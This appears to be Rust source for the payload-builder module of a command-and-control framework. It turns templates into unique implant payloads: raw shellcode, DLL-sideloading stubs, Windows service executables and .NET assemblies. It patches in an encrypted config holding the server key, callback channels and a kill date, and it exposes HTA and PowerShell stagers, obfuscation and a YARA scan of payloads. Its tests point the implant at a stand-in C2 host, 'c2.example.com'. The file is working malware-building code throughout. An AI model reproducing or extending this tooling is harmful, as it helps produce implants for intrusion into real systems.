pub mod config_gen;
pub mod formats;
pub mod obfuscation;
pub mod yara;

pub use config_gen::{generate_config, ChannelConfig, GeneratedConfig, SleepConfig};
pub use formats::{
    format_dll, format_dotnet, format_hta_stager, format_ps1_stager, format_raw,
    format_service_exe, list_formats, FormatInfo,
};
pub use obfuscation::{obfuscate, ObfuscationError, ObfuscationSettings};
pub use yara::{scan_payload, YaraError, YaraMatch};

use std::collections::HashMap;
use std::path::PathBuf;

use thiserror::Error;
use x25519_dalek::PublicKey;

use crate::profile::schema::Profile;

#[derive(Debug, Error)]
pub enum BuilderError {
    #[error("config error: {0}")]
    Config(String),
    #[error("template not found: {0}")]
    TemplateNotFound(String),
    #[error("toolchain error: {0}")]
    Toolchain(String),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
}

/// Output format for generated payloads.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum OutputFormat {
    /// Raw PIC shellcode blob + config.
    RawShellcode,
    /// DLL sideloading payload.
    DllSideload,
    /// Windows service EXE.
    ServiceExe,
    /// .NET assembly wrapper.
    DotNetAssembly,
}

impl OutputFormat {
    pub fn as_str(&self) -> &'static str {
        match self {
            OutputFormat::RawShellcode => "raw",
            OutputFormat::DllSideload => "dll",
            OutputFormat::ServiceExe => "service_exe",
            OutputFormat::DotNetAssembly => "dotnet",
        }
    }

    pub fn extension(&self) -> &'static str {
        match self {
            OutputFormat::RawShellcode => "bin",
            OutputFormat::DllSideload => "dll",
            OutputFormat::ServiceExe => "exe",
            OutputFormat::DotNetAssembly => "exe",
        }
    }

    #[allow(clippy::should_implement_trait)]
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "raw" | "shellcode" | "bin" => Some(OutputFormat::RawShellcode),
            "dll" | "sideload" => Some(OutputFormat::DllSideload),
            "service_exe" | "service" | "exe" => Some(OutputFormat::ServiceExe),
            "dotnet" | ".net" | "assembly" => Some(OutputFormat::DotNetAssembly),
            _ => None,
        }
    }
}

/// Pre-compiled template blob loaded at init.
#[derive(Debug, Clone)]
pub struct TemplateBlob {
    /// Raw bytes of the template (PIC blob, DLL stub, etc.).
    pub data: Vec<u8>,
    /// Descriptive name.
    pub name: String,
    /// Output format this template supports.
    pub format: OutputFormat,
}

/// Configuration for payload builder initialization.
#[derive(Debug, Clone)]
pub struct BuilderConfig {
    /// Directory containing pre-compiled template blobs.
    pub template_dir: PathBuf,
}

/// Result of a payload build.
#[derive(Debug, Clone)]
pub struct BuildResult {
    /// The final payload bytes.
    pub payload: Vec<u8>,
    /// Output format used.
    pub format: OutputFormat,
    /// Implant X25519 public key for this build.
    pub implant_pubkey: [u8; 32],
    /// Unique build ID.
    pub build_id: String,
}

/// Payload builder: loads pre-compiled template blobs and applies binary-level
/// transforms to produce unique implant payloads.
pub struct PayloadBuilder {
    /// Loaded template blobs keyed by output format.
    templates: HashMap<OutputFormat, TemplateBlob>,
    /// Path to template directory.
    template_dir: PathBuf,
}

impl PayloadBuilder {
    /// Initialize the payload builder with the given config.
    ///
    /// Verifies the template directory exists and loads any available templates.
    pub fn new(config: &BuilderConfig) -> Result<Self, BuilderError> {
        let mut builder = Self {
            templates: HashMap::new(),
            template_dir: config.template_dir.clone(),
        };
        builder.load_templates()?;
        Ok(builder)
    }

    /// Verify toolchain availability and load template blobs from disk.
    fn load_templates(&mut self) -> Result<(), BuilderError> {
        if !self.template_dir.exists() {
            // Template dir is optional — builder can work without pre-compiled templates
            // by generating raw shellcode from config only.
            tracing::warn!(
                "Template directory does not exist: {}",
                self.template_dir.display()
            );
            return Ok(());
        }

        // Load known template files
        let template_files: &[(&str, OutputFormat)] = &[
            ("specter.bin", OutputFormat::RawShellcode),
            ("sideload_stub.dll", OutputFormat::DllSideload),
            ("service_stub.exe", OutputFormat::ServiceExe),
            ("dotnet_stub.exe", OutputFormat::DotNetAssembly),
        ];

        for (filename, format) in template_files {
            let path = self.template_dir.join(filename);
            if path.exists() {
                let data = std::fs::read(&path)?;
                tracing::info!("Loaded template '{}' ({} bytes)", filename, data.len());
                self.templates.insert(
                    *format,
                    TemplateBlob {
                        data,
                        name: filename.to_string(),
                        format: *format,
                    },
                );
            }
        }

        Ok(())
    }

    /// Check if a particular output format is available (has a loaded template).
    pub fn has_format(&self, format: OutputFormat) -> bool {
        self.templates.contains_key(&format)
    }

    /// List available output formats.
    pub fn available_formats(&self) -> Vec<OutputFormat> {
        self.templates.keys().copied().collect()
    }

    /// Build a payload in the specified output format.
    ///
    /// 1. Generate implant config blob (X25519 keypair, profile, channels, etc.)
    /// 2. Retrieve the template blob for the requested format
    /// 3. Embed the config blob into the template using binary patching
    /// 4. Return the final payload
    pub fn build(
        &self,
        format: OutputFormat,
        profile: &Profile,
        server_pubkey: &PublicKey,
        channels: &[ChannelConfig],
        sleep_config: &SleepConfig,
        kill_date: Option<i64>,
    ) -> Result<BuildResult, BuilderError> {
        // Generate config
        let gen = generate_config(profile, server_pubkey, channels, sleep_config, kill_date)?;

        let build_id = uuid::Uuid::new_v4().to_string();

        // For raw shellcode, we can produce output even without a template
        // by concatenating PIC blob + config
        let payload = if format == OutputFormat::RawShellcode {
            self.format_raw(&gen)?
        } else {
            let template = self.templates.get(&format).ok_or_else(|| {
                BuilderError::TemplateNotFound(format!(
                    "no template for format '{}'",
                    format.as_str()
                ))
            })?;
            self.embed_config(template, &gen)?
        };

        Ok(BuildResult {
            payload,
            format,
            implant_pubkey: gen.implant_pubkey,
            build_id,
        })
    }

    /// Format raw shellcode: PIC template blob + config blob appended.
    ///
    /// Layout: [PIC blob][config_len: u32 LE][config_blob]
    fn format_raw(&self, gen: &GeneratedConfig) -> Result<Vec<u8>, BuilderError> {
        let mut payload = Vec::new();

        // If we have a raw template (specter.bin), prepend it
        if let Some(template) = self.templates.get(&OutputFormat::RawShellcode) {
            payload.extend_from_slice(&template.data);
        }

        // Append config: [length: u32 LE][encrypted config blob]
        let config_len = gen.config_blob.len() as u32;
        payload.extend_from_slice(&config_len.to_le_bytes());
        payload.extend_from_slice(&gen.config_blob);

        Ok(payload)
    }

    /// Embed config into a template blob by locating the config placeholder marker
    /// and patching it with the actual config data.
    ///
    /// Marker: 16 bytes of 0x43 ("CCCCCCCCCCCCCCCC") followed by 4-byte LE max size.
    /// The builder replaces this region with: [config_len: u32 LE][config_blob][zero-pad].
    fn embed_config(
        &self,
        template: &TemplateBlob,
        gen: &GeneratedConfig,
    ) -> Result<Vec<u8>, BuilderError> {
        const MARKER: &[u8; 16] = b"CCCCCCCCCCCCCCCC";

        let mut payload = template.data.clone();

        // Find the config placeholder marker
        if let Some(marker_pos) = find_marker(&payload, MARKER) {
            // Read the max config size from the 4 bytes after the marker
            let size_offset = marker_pos + 16;
            if size_offset + 4 > payload.len() {
                return Err(BuilderError::Config(
                    "config marker found but size field truncated".into(),
                ));
            }
            let max_size = u32::from_le_bytes([
                payload[size_offset],
                payload[size_offset + 1],
                payload[size_offset + 2],
                payload[size_offset + 3],
            ]) as usize;

            let config_with_len = {
                let mut buf = Vec::with_capacity(4 + gen.config_blob.len());
                buf.extend_from_slice(&(gen.config_blob.len() as u32).to_le_bytes());
                buf.extend_from_slice(&gen.config_blob);
                buf
            };

            if config_with_len.len() > max_size + 20 {
                return Err(BuilderError::Config(format!(
                    "config blob ({} bytes) exceeds template capacity ({} bytes)",
                    config_with_len.len(),
                    max_size
                )));
            }

            // Patch: overwrite marker + size + reserved area
            let patch_region = marker_pos..marker_pos + 20 + max_size;
            let patch_end = patch_region.end.min(payload.len());
            let patch_start = patch_region.start;

            // Zero the region first, then write config
            for byte in &mut payload[patch_start..patch_end] {
                *byte = 0;
            }
            let write_end = (patch_start + config_with_len.len()).min(patch_end);
            payload[patch_start..write_end]
                .copy_from_slice(&config_with_len[..write_end - patch_start]);
        } else {
            // No marker found — append config to the end (fallback)
            let config_len = gen.config_blob.len() as u32;
            payload.extend_from_slice(&config_len.to_le_bytes());
            payload.extend_from_slice(&gen.config_blob);
        }

        Ok(payload)
    }
}

/// Initialize the payload builder (convenience wrapper).
pub fn builder_init(config: &BuilderConfig) -> Result<PayloadBuilder, BuilderError> {
    PayloadBuilder::new(config)
}

/// Find a byte marker in a blob.
fn find_marker(data: &[u8], marker: &[u8]) -> Option<usize> {
    data.windows(marker.len())
        .position(|window| window == marker)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::profile::parse_profile;
    use std::io::Write;
    use tempfile::TempDir;

    fn test_profile() -> Profile {
        parse_profile(
            r#"
name: builder-test
description: test
tls:
  cipher_suites: ["TLS_AES_128_GCM_SHA256"]
http:
  request:
    method: POST
    uri_patterns: ["/api/checkin"]
  response:
    status_code: 200
timing:
  callback_interval: 30
transform:
  compress: lz4
  encrypt: chacha20-poly1305
  encode: base64
"#,
        )
        .unwrap()
    }

    fn test_channels() -> Vec<ChannelConfig> {
        vec![ChannelConfig {
            kind: "https".into(),
            address: "https://c2.example.com/api/checkin".into(),
        }]
    }

    #[test]
    fn test_builder_init_missing_dir() {
        let config = BuilderConfig {
            template_dir: PathBuf::from("/nonexistent/path"),
        };
        // Should succeed — missing template dir is a warning, not an error
        let builder = builder_init(&config).unwrap();
        assert!(builder.available_formats().is_empty());
    }

    #[test]
    fn test_builder_load_templates() {
        let dir = TempDir::new().unwrap();
        let mut f = std::fs::File::create(dir.path().join("specter.bin")).unwrap();
        f.write_all(&[0xCC; 64]).unwrap();

        let config = BuilderConfig {
            template_dir: dir.path().to_path_buf(),
        };
        let builder = builder_init(&config).unwrap();
        assert!(builder.has_format(OutputFormat::RawShellcode));
        assert!(!builder.has_format(OutputFormat::DllSideload));
    }

    #[test]
    fn test_builder_raw_build_no_template() {
        let config = BuilderConfig {
            template_dir: PathBuf::from("/nonexistent"),
        };
        let builder = builder_init(&config).unwrap();

        let secret = x25519_dalek::StaticSecret::random_from_rng(rand::thread_rng());
        let pubkey = PublicKey::from(&secret);

        let result = builder
            .build(
                OutputFormat::RawShellcode,
                &test_profile(),
                &pubkey,
                &test_channels(),
                &SleepConfig::default(),
                None,
            )
            .unwrap();

        // Should produce: [config_len: 4][config_blob]
        assert!(result.payload.len() > 4);
        let config_len = u32::from_le_bytes([
            result.payload[0],
            result.payload[1],
            result.payload[2],
            result.payload[3],
        ]) as usize;
        assert_eq!(result.payload.len(), 4 + config_len);
    }

    #[test]
    fn test_builder_raw_build_with_template() {
        let dir = TempDir::new().unwrap();
        let template_data = vec![0x90; 128]; // NOP sled as fake PIC blob
        std::fs::write(dir.path().join("specter.bin"), &template_data).unwrap();

        let config = BuilderConfig {
            template_dir: dir.path().to_path_buf(),
        };
        let builder = builder_init(&config).unwrap();

        let secret = x25519_dalek::StaticSecret::random_from_rng(rand::thread_rng());
        let pubkey = PublicKey::from(&secret);

        let result = builder
            .build(
                OutputFormat::RawShellcode,
                &test_profile(),
                &pubkey,
                &test_channels(),
                &SleepConfig::default(),
                None,
            )
            .unwrap();

        // Payload starts with the template
        assert_eq!(&result.payload[..128], &template_data[..]);
        // Then config_len + config
        let config_len = u32::from_le_bytes([
            result.payload[128],
            result.payload[129],
            result.payload[130],
            result.payload[131],
        ]) as usize;
        assert_eq!(result.payload.len(), 128 + 4 + config_len);
    }

    #[test]
    fn test_builder_embed_config_with_marker() {
        let dir = TempDir::new().unwrap();

        // Create a DLL stub with a config marker and enough room for config blob
        let mut stub = vec![0x00u8; 2048];
        // Place marker at offset 64
        stub[64..80].copy_from_slice(b"CCCCCCCCCCCCCCCC");
        // Max config size = 1024 bytes (after the 16-byte marker + 4-byte size)
        stub[80..84].copy_from_slice(&1024u32.to_le_bytes());

        std::fs::write(dir.path().join("sideload_stub.dll"), &stub).unwrap();

        let config = BuilderConfig {
            template_dir: dir.path().to_path_buf(),
        };
        let builder = builder_init(&config).unwrap();
        assert!(builder.has_format(OutputFormat::DllSideload));

        let secret = x25519_dalek::StaticSecret::random_from_rng(rand::thread_rng());
        let pubkey = PublicKey::from(&secret);

        let result = builder
            .build(
                OutputFormat::DllSideload,
                &test_profile(),
                &pubkey,
                &test_channels(),
                &SleepConfig::default(),
                None,
            )
            .unwrap();

        // The marker region should be patched (no more "CCCC..." at offset 64)
        assert_ne!(&result.payload[64..80], b"CCCCCCCCCCCCCCCC");
        // Payload size should be same as stub (in-place patching)
        assert_eq!(result.payload.len(), stub.len());
    }

    #[test]
    fn test_builder_missing_template_format() {
        let config = BuilderConfig {
            template_dir: PathBuf::from("/nonexistent"),
        };
        let builder = builder_init(&config).unwrap();

        let secret = x25519_dalek::StaticSecret::random_from_rng(rand::thread_rng());
        let pubkey = PublicKey::from(&secret);

        let result = builder.build(
            OutputFormat::DllSideload,
            &test_profile(),
            &pubkey,
            &test_channels(),
            &SleepConfig::default(),
            None,
        );
        assert!(result.is_err());
    }

    #[test]
    fn test_output_format_roundtrip() {
        for fmt in &[
            OutputFormat::RawShellcode,
            OutputFormat::DllSideload,
            OutputFormat::ServiceExe,
            OutputFormat::DotNetAssembly,
        ] {
            let s = fmt.as_str();
            let parsed = OutputFormat::from_str(s).expect(&format!("should parse '{s}'"));
            assert_eq!(*fmt, parsed);
        }
    }

    #[test]
    fn test_find_marker() {
        let data = b"\x00\x00\x00CCCCCCCCCCCCCCCC\x80\x00\x00\x00";
        let pos = find_marker(data, b"CCCCCCCCCCCCCCCC");
        assert_eq!(pos, Some(3));
    }

    #[test]
    fn test_builds_are_unique() {
        let config = BuilderConfig {
            template_dir: PathBuf::from("/nonexistent"),
        };
        let builder = builder_init(&config).unwrap();

        let secret = x25519_dalek::StaticSecret::random_from_rng(rand::thread_rng());
        let pubkey = PublicKey::from(&secret);

        let r1 = builder
            .build(
                OutputFormat::RawShellcode,
                &test_profile(),
                &pubkey,
                &test_channels(),
                &SleepConfig::default(),
                None,
            )
            .unwrap();
        let r2 = builder
            .build(
                OutputFormat::RawShellcode,
                &test_profile(),
                &pubkey,
                &test_channels(),
                &SleepConfig::default(),
                None,
            )
            .unwrap();

        // Each build should produce a unique payload (different keypair + nonce)
        assert_ne!(r1.payload, r2.payload);
        assert_ne!(r1.implant_pubkey, r2.implant_pubkey);
        assert_ne!(r1.build_id, r2.build_id);
    }
}
